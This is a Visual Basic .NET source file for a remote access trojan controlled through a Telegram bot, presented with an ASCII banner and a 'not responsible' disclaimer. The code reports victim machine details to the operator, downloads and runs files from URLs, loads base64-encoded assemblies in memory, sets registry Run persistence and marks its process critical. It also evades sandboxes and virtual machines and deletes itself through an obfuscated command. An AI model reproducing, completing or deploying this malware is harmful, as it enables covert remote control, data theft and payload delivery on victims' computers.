Public Class Form1

    '                                                                                                                                                                                                                                                                                                                                     
    '                                                                                                                                                                                                                                                                                                                                     
    '                                     HHHHHHHHH     HHHHHHHHH                                                                                                                                                        RRRRRRRRRRRRRRRRR     iiii                                          lllllll                                      
    '                                     H:::::::H     H:::::::H                                                                                                                                                        R::::::::::::::::R   i::::i                                         l:::::l                                      
    '                                     H:::::::H     H:::::::H                                                                                                                                                        R::::::RRRRRR:::::R   iiii                                          l:::::l                                      
    '                                     HH::::::H     H::::::HH                                                                                                                                                        RR:::::R     R:::::R                                                l:::::l                                      
    '                                       H:::::H     H:::::Hwwwwwww           wwwww           wwwwwww ooooooooooo   rrrrr   rrrrrrrrr   aaaaaaaaaaaaa  nnnn  nnnnnnnn       ggggggggg   ggggg    eeeeeeeeeeee           R::::R     R:::::Riiiiiiivvvvvvv           vvvvvvvaaaaaaaaaaaaa    l::::l                                      
    '                 ::::::  ::::::        H:::::H     H:::::H w:::::w         w:::::w         w:::::woo:::::::::::oo r::::rrr:::::::::r  a::::::::::::a n:::nn::::::::nn    g:::::::::ggg::::g  ee::::::::::::ee         R::::R     R:::::Ri:::::i v:::::v         v:::::v a::::::::::::a   l::::l       ::::::  ::::::                 
    '                 ::::::  ::::::        H::::::HHHHH::::::H  w:::::w       w:::::::w       w:::::wo:::::::::::::::or:::::::::::::::::r aaaaaaaaa:::::an::::::::::::::nn  g:::::::::::::::::g e::::::eeeee:::::ee       R::::RRRRRR:::::R  i::::i  v:::::v       v:::::v  aaaaaaaaa:::::a  l::::l       ::::::  ::::::                 
    '                 ::::::  ::::::        H:::::::::::::::::H   w:::::w     w:::::::::w     w:::::w o:::::ooooo:::::orr::::::rrrrr::::::r         a::::ann:::::::::::::::ng::::::ggggg::::::gge::::::e     e:::::e       R:::::::::::::RR   i::::i   v:::::v     v:::::v            a::::a  l::::l       ::::::  ::::::                 
    '                                       H:::::::::::::::::H    w:::::w   w:::::w:::::w   w:::::w  o::::o     o::::o r:::::r     r:::::r  aaaaaaa:::::a  n:::::nnnn:::::ng:::::g     g:::::g e:::::::eeeee::::::e       R::::RRRRRR:::::R  i::::i    v:::::v   v:::::v      aaaaaaa:::::a  l::::l                                      
    '                                       H::::::HHHHH::::::H     w:::::w w:::::w w:::::w w:::::w   o::::o     o::::o r:::::r     rrrrrrraa::::::::::::a  n::::n    n::::ng:::::g     g:::::g e:::::::::::::::::e        R::::R     R:::::R i::::i     v:::::v v:::::v     aa::::::::::::a  l::::l                                      
    '                                       H:::::H     H:::::H      w:::::w:::::w   w:::::w:::::w    o::::o     o::::o r:::::r           a::::aaaa::::::a  n::::n    n::::ng:::::g     g:::::g e::::::eeeeeeeeeee         R::::R     R:::::R i::::i      v:::::v:::::v     a::::aaaa::::::a  l::::l                                      
    '                 ::::::  ::::::        H:::::H     H:::::H       w:::::::::w     w:::::::::w     o::::o     o::::o r:::::r          a::::a    a:::::a  n::::n    n::::ng::::::g    g:::::g e:::::::e                  R::::R     R:::::R i::::i       v:::::::::v     a::::a    a:::::a  l::::l       ::::::  ::::::                 
    '                 ::::::  ::::::      HH::::::H     H::::::HH      w:::::::w       w:::::::w      o:::::ooooo:::::o r:::::r          a::::a    a:::::a  n::::n    n::::ng:::::::ggggg:::::g e::::::::e               RR:::::R     R:::::Ri::::::i       v:::::::v      a::::a    a:::::a l::::::l      ::::::  ::::::                 
    ' ......  ......  ::::::  ::::::      H:::::::H     H:::::::H       w:::::w         w:::::w       o:::::::::::::::o r:::::r          a:::::aaaa::::::a  n::::n    n::::n g::::::::::::::::g  e::::::::eeeeeeee       R::::::R     R:::::Ri::::::i        v:::::v       a:::::aaaa::::::a l::::::l      ::::::  ::::::  ......  ...... 
    ' .::::.  .::::.                      H:::::::H     H:::::::H        w:::w           w:::w         oo:::::::::::oo  r:::::r           a::::::::::aa:::a n::::n    n::::n  gg::::::::::::::g   ee:::::::::::::e       R::::::R     R:::::Ri::::::i         v:::v         a::::::::::aa:::al::::::l                      .::::.  .::::. 
    ' ......  ......                      HHHHHHHHH     HHHHHHHHH         www             www            ooooooooooo    rrrrrrr            aaaaaaaaaa  aaaa nnnnnn    nnnnnn    gggggggg::::::g     eeeeeeeeeeeeee       RRRRRRRR     RRRRRRRiiiiiiii          vvv           aaaaaaaaaa  aaaallllllll                      ......  ...... 
    '                                                                                                                                                                                   g:::::g                                                                                                                                           
    '                                                                                                                                                                       gggggg      g:::::g                                                                                                                                           
    '                                                                                                                                                                       g:::::gg   gg:::::g                                                                                                                                           
    '                                                                                                                                                                        g::::::ggg:::::::g                                                                                                                                           
    '                                                                                                                                                                         gg:::::::::::::g                                                                                                                                            
    '                                                                                                                                                                           ggg::::::ggg                                                                                                                                              
    '                                                                                                                                                                              gggggg                                                                                                                                                 
    'Developed for fun in free Time. Do not use for Illegal activity.
    'i'm not responsable for your use
    'Enjoy !!!
    '__ ..:: Hworange Rival ;;..

    Public StrConn As String = "-", id As String = "-"
    Private Class NativeMethods
        Friend Declare Function SetThreadExecutionState Lib "kernel32" (ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
        <Runtime.InteropServices.DllImport("NTdll.dll", EntryPoint:="RtlSetProcessIsCritical", SetLastError:=True)>
        Public Shared Sub SetCurrentProcessIsCritical(
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal isCritical As Boolean,
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByRef refWasCritical As Boolean,
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal needSystemCriticalBreaks As Boolean)
        End Sub
        <Runtime.InteropServices.DllImport("kernel32.dll")> Public Shared Function LoadLibrary(ByVal dllToLoad As String) As Boolean
        End Function
    End Class

    <Flags()>
    Enum EXECUTION_STATE As Integer
        ES_CONTINUOUS = &H80000000
        ES_USER_PRESENT = &H4
        ES_DISPLAY_REQUIRED = &H2
        ES_SYSTEM_REQUIRED = &H1
    End Enum
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim BinText As String = IO.File.ReadAllText(Application.ExecutablePath)
        If BinText.Contains("§") = False Then Exit Sub
        Dim ArrContents() As String = Split(BinText, "§")
        StrConn = ArrContents(1) : id = ArrContents(2)
        If My.Computer.Network.IsAvailable Then
            Connect()
        Else
            Do While My.Computer.Network.IsAvailable : Application.DoEvents() : Loop
            Connect()
        End If
        ProtectionHW_AntiVMAndSandBox()
    End Sub
    Private Sub Connect()
        Net.ServicePointManager.SecurityProtocol = Net.SecurityProtocolType.Tls12
        Try
            BotClient = New Telegram.Bot.TelegramBotClient(StrConn) 'botfatherkey
            Dim miooo As Telegram.Bot.Types.User = BotClient.GetMeAsync().Result
            Dim a As String = "Name: " & miooo.Id & "_" & My.Computer.Name & vbCrLf & "/help - for help" & vbCrLf
            AddHandler BotClient.OnMessage, AddressOf Bot_OnMessage
            AddHandler BotClientMessageReceived, AddressOf Interagisci
            BotClient.StartReceiving()
            If BotClient.IsReceiving Then Bot_SendMessage(id, "New Connection!!!!" & vbCrLf & a)
        Catch ex As Exception
            '     MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub Interagisci(Message As String)
        Try
            Dim str As String() = Split(Message, "/")
            Select Case str(1)
                Case "help" : If ISBotConnected() Then Bot_SendMessage(id, My.Settings.infocommandi)
                Case "info" : If ISBotConnected() Then Bot_SendMessage(id, getinfo)
                Case "delnxbt" : DeleteNextBoot()
                Case "spc" : SetIsCritical()
                Case "unspc" : UnSetIsCritical()
                Case "nosleep" : DisablePowerSaving()
                Case "mbx" : MsgBox(str(2), Nothing, "Microsoft Windows")
                Case "unistall" : unistallClient()
                Case "execurl" : LoadFromURL(str(2), str(3))
                Case "setstartup" : My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
                Case "unsetstartup" : My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                Case "exec" : exec(str(2))
                Case "end" : UnSetIsCritical() : Application.Exit()
            End Select
        Catch ex As Exception
        End Try
    End Sub
    Private Function getinfo() As String
        On Error Resume Next
        Dim Arch As String = ""
        If Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Contains("64") Then Arch = " x64" Else Arch = " x86"
        Dim Fl As String = vbCrLf, a As String = "Target Name: " & Environment.MachineName & Fl & "System: " & Environment.OSVersion.VersionString & Arch &
                 Fl & "UserName: " & Environment.UserDomainName & Fl & "Address: " & Net.Dns.GetHostEntry(Net.Dns.GetHostName).AddressList(0).ToString &
                  Fl & "Framework: " & dotNET() & Fl
        Return a
    End Function
    Private Sub exec(str As String)

        Try
            Dim b As Byte() = Convert.FromBase64String(str)
            Dim Assembly = Reflection.Assembly.Load(b)
            Dim EntryPoint = Assembly.EntryPoint
            If EntryPoint IsNot Nothing Then
                Dim t As New Threading.Thread(Sub()
                                                  EntryPoint.Invoke(Nothing, Nothing)
                                              End Sub)
                t.Start()
                Bot_SendMessage(id, "Executed! =)")
            Else
                Dim Types = Assembly.GetTypes
                For Each Type In Types
                    If Type.Name = "Main" Then
                        Try
                            Dim Proc = Type.GetMethod("Main")
                            If Proc Is Nothing Then Continue For
                            Dim task As New Threading.Thread(Sub()
                                                                 Proc.Invoke(Nothing, Nothing)
                                                             End Sub)
                            task.Start()
                            Bot_SendMessage(id, "Executed! =)")
                        Catch ax As Exception
                            Try
                                Dim a As Reflection.Assembly = Reflection.Assembly.Load(b)
                                Dim metodo As Reflection.MethodInfo = a.EntryPoint
                                metodo.Invoke(Nothing, New Object() {Nothing})
                                Bot_SendMessage(id, "Executed! =)")
                            Catch bx As Exception
                                If ISBotConnected() Then Bot_SendMessage(id, "EXEC COMMAND ERROR!: " & bx.Message)
                            End Try
                        End Try
                    End If
                Next
            End If
        Catch ex As Exception
            If ISBotConnected() Then Bot_SendMessage(id, "EXEC CODIFY ERROR!: " & ex.Message)
        End Try
    End Sub
    Private Sub unistallClient()
        Try : Dim Info As New ProcessStartInfo() : UnSetIsCritical()
            'crypting POC...to test if it work...
            Dim strx As String = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA=="))
            Info.Arguments = strx & """" & Application.ExecutablePath & """"
            Info.WindowStyle = ProcessWindowStyle.Hidden : Info.CreateNoWindow = True : Info.FileName = "cmd.exe"
            System.Diagnostics.Process.Start(Info) : System.Threading.Thread.Sleep(1)
            Info.Arguments = strx & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote
            System.Diagnostics.Process.Start(Info) : Application.Exit()
        Catch ex As Exception : End Try
    End Sub
    Private Sub SetIsCritical()
        Try : Dim r As Boolean
            System.Diagnostics.Process.EnterDebugMode()
            NativeMethods.SetCurrentProcessIsCritical(True, r, False)
        Catch ex As Exception : End Try
    End Sub
    Private Sub UnSetIsCritical()
        Try : Dim r As Boolean : NativeMethods.SetCurrentProcessIsCritical(False, r, False) : Catch ex As Exception : End Try
    End Sub
    Private Sub LoadFromURL(Extension As String, URL As String)
        Dim NewFile = IO.Path.GetTempFileName.Replace(".tmp", Extension)
        Dim WC As New Net.WebClient
        WC.DownloadFile(URL, NewFile)
        Threading.Thread.CurrentThread.Sleep(1000)
        Diagnostics.Process.Start(NewFile)
    End Sub
    Public Shared Function dotNET() As String
        Try
            Dim dot As New Text.StringBuilder
            For Each x In IO.Directory.GetDirectories(Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory().Substring(0, 34))
                If x.Contains("v4.0") Then
                    dot.Append("v4.0")
                ElseIf x.Contains("v2.0") Then
                    dot.Append("v2.0 ")
                End If
            Next
            Return dot.ToString
        Catch ex As Exception
            Return "Error"
        End Try
    End Function
    Function DisablePowerSaving() As EXECUTION_STATE
        Return NativeMethods.SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED _
                                                     Or EXECUTION_STATE.ES_DISPLAY_REQUIRED _
                                                     Or EXECUTION_STATE.ES_CONTINUOUS)
    End Function
    Private Sub ProtectionHW_AntiVMAndSandBox()
        If NativeMethods.LoadLibrary("SbieDll.dll") = True Then unistallClient()
        If NativeMethods.LoadLibrary("vboxhook.dll") = True Then unistallClient()
    End Sub
    Private Sub DeleteNextBoot()

        'If your goal Is To run your EXE And Then have it removed sooner-Or-later, there are a couple Of options

        '1) MoveFileEx() API
        'https://docs.microsoft.com/it-it/windows/win32/api/winbase/nf-winbase-movefileexa?redirectedfrom=MSDN
        '  If you Then specify the "MOVEFILE_DELAY_UNTIL_REBOOT" flag, And rename from 'your.exe' to '', then Windows will delete it on the next reboot.
    End Sub

End Class

